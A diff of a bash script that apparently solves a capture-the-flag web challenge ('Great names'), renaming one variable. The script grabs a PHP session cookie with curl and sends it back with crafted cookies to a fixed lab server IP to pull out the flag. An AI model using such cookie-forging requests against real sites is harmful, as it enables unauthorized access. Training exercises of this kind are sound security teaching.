@@ -3,19 +3,19 @@ PORT=8080
 
 if [[ $1 == "local" ]]
 then
-    remote='http://127.0.0.1:'$PORT
+    url='http://127.0.0.1:'$PORT
 elif [[ $1 == "remote" ]] && [[ -z $2 ]] 
 then
-    remote='http://141.85.224.157:'$PORT
+    url='http://141.85.224.157:'$PORT
 else
-    remote=$1':'$2
+    url=$1':'$2
 fi
 
 # Great names
 echo "Start exploit for Great names"
-remote=$remote
-curl -s -c cookies.txt -o /dev/null $remote
+url=$url
+curl -s -c cookies.txt -o /dev/null $url
 phpsessid=$(cat cookies.txt | grep PHPSESSID | awk '{print $7}')
-flag=$(curl -s -b 'PHPSESSID='$phpsessid';marco=polo;fernando=magellan;cristofor=columb' $remote | grep -o "SSS{.*}")
+flag=$(curl -s -b 'PHPSESSID='$phpsessid';marco=polo;fernando=magellan;cristofor=columb' $url | grep -o "SSS{.*}")
 echo "Flag is $flag"
 echo "----------------------------"
